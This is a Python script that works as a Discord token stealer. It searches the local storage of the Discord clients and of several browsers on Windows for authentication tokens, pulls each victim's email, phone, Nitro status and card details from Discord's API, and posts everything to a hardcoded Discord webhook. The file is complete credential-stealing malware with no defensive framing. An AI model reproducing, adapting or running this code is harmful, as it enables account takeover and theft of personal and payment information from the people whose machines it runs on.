import os
import re
import json
import base64
import urllib.request
import urllib.error
import typing
import string
import ssl
import scipy
import matplotlib
import PyQt5
import PIL
import numpy as np
import pandas as pd
import cv2
import sklearn
from PIL import Image
import matplotlib.pyplot as plt

# Force inclusion of binaries
np.array([1, 2, 3])
pd.DataFrame({"a": [1, 2, 3]})
cv2.getBuildInformation()
print("sklearn version:", sklearn.__version__)
Image.new("RGB", (100, 100))
plt.plot([1, 2, 3])
plt.savefig("temp.png")

TOKEN_REGEX = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"
HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0"
}

WEBHOOK_URL = "https://discord.com/api/webhooks/1387438745615204403/Qsd4r_XpkjhTPievoYEJs9GT2XBu2r6N6V2OtzsXBTUPfRp33WsUDd8oR7pgL6lNSbkO"  # redacted


ssl._create_default_https_context = ssl._create_unverified_context


def make_post_request(api_url: str, data: dict) -> int:
    request = urllib.request.Request(api_url, data=json.dumps(data).encode(), headers=HEADERS)
    with urllib.request.urlopen(request) as response:
        return response.status


def get_tokens_from_file(file_path: str) -> typing.List[str]:
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
            return re.findall(TOKEN_REGEX, content)
    except:
        return []


def get_user_id_from_token(token: str) -> typing.Optional[str]:
    try:
        return base64.b64decode(token.split(".")[0] + "==").decode()
    except:
        return None


def discord_api_request(url: str, token: str) -> typing.Optional[dict]:
    req = urllib.request.Request(url)
    req.add_header("Authorization", token)
    req.add_header("User-Agent", HEADERS["User-Agent"])
    try:
        with urllib.request.urlopen(req) as response:
            return json.load(response)
    except urllib.error.HTTPError:
        return None
    except:
        return None


def get_ip_from_token(token: str) -> typing.Optional[str]:
    # IP from token is not accessible, so return unavailable
    return "Unavailable"


def collect_tokens_from_paths(paths: typing.List[str]) -> typing.Dict[str, typing.Set[str]]:
    user_tokens = {}

    for path in paths:
        if not os.path.exists(path):
            continue

        for root, _, files in os.walk(path):
            for file in files:
                if file.endswith((".log", ".ldb")):
                    full_path = os.path.join(root, file)
                    tokens = get_tokens_from_file(full_path)
                    for token in tokens:
                        user_id = get_user_id_from_token(token)
                        if user_id:
                            user_tokens.setdefault(user_id, set()).add(token)

    return user_tokens


def get_chrome_profile_paths() -> typing.List[str]:
    local = os.getenv("LOCALAPPDATA")
    user_data_path = os.path.join(local, "Google", "Chrome", "User Data")
    profile_paths = []

    if not os.path.exists(user_data_path):
        return profile_paths

    for item in os.listdir(user_data_path):
        full_path = os.path.join(user_data_path, item, "Local Storage", "leveldb")
        if os.path.isdir(full_path):
            profile_paths.append(full_path)

    return profile_paths




def build_embed_for_user(token: str) -> typing.Optional[dict]:
    user_data = discord_api_request("https://discord.com/api/v9/users/@me", token)
    if not user_data:
        return None

    email = user_data.get("email", "None")
    phone = user_data.get("phone", "None")
    username = f"{user_data.get('username', 'Unknown')}#{user_data.get('discriminator', '0000')}"
    user_id = user_data.get("id", "Unknown")

    # Nitro boost info: Check premium_type (1 = Nitro Classic, 2 = Nitro)
    premium_type = user_data.get("premium_type", 0)
    if premium_type == 1:
        boost_status = "Nitro Classic"
    elif premium_type == 2:
        boost_status = "Nitro"
    else:
        boost_status = "None"

    # Payment methods (cards or PayPal)
    payments = discord_api_request("https://discord.com/api/v9/users/@me/billing/payment-sources", token)
    payment_methods = []
    if payments:
        for method in payments:
            typ = method.get("type", "Unknown")
            if typ == 1:
                card = method.get("card", {})
                brand = card.get("brand", "Unknown")
                last4 = card.get("last_4", "****")
                payment_methods.append(f"Card: {brand} ****{last4}")
            elif typ == 2:
                payment_methods.append("PayPal")
            else:
                payment_methods.append("Other")

    payment_methods_str = ", ".join(payment_methods) if payment_methods else "None"

    ip_address = get_ip_from_token(token)

    embed = {
        "title": f"User: {username}",
        "color": 0x00ff00,
        "fields": [
            {"name": "User ID", "value": user_id, "inline": True},
            {"name": "Email", "value": email, "inline": True},
            {"name": "Phone", "value": phone if phone else "None", "inline": True},
            {"name": "Boost Status", "value": boost_status, "inline": True},
            {"name": "Payment Methods", "value": payment_methods_str, "inline": True},
            {"name": "IP Address", "value": ip_address, "inline": True},
            {"name": "Token", "value": token, "inline": False},
        ]
    }
    return embed


def send_tokens(user_token_dict: typing.Dict[str, typing.Set[str]]) -> None:
    if not user_token_dict:
        return

    embeds = []

    for user_id, tokens in user_token_dict.items():
        for token in tokens:
            embed = build_embed_for_user(token)
            if embed:
                embeds.append(embed)

    max_embeds_per_request = 100
    for i in range(0, len(embeds), max_embeds_per_request):
        batch = embeds[i:i + max_embeds_per_request]
        data = {"content": "🍣 Found Discord Tokens", "embeds": batch}
        try:
            make_post_request(WEBHOOK_URL, data)
        except Exception as e:
            print(f"Failed to send webhook: {e}")


def main():
    
    local = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")

    token_paths = [
        os.path.join(roaming, "Discord", "Local Storage", "leveldb"),
        os.path.join(roaming, "discordptb", "Local Storage", "leveldb"),
        os.path.join(roaming, "discordcanary", "Local Storage", "leveldb"),
        os.path.join(roaming, "Vencord", "Local Storage", "leveldb"),
        os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
        os.path.join(local, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
        os.path.join(roaming, "Opera Software", "Opera Stable", "Local Storage", "leveldb"),
        os.path.join(roaming, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb"),
        os.path.join(roaming, "Mozilla", "Firefox", "Profiles"),
    ]
    

    token_paths.extend(get_chrome_profile_paths())



    
    all_tokens = collect_tokens_from_paths(token_paths)
    send_tokens(all_tokens)


if __name__ == "__main__":
    main()
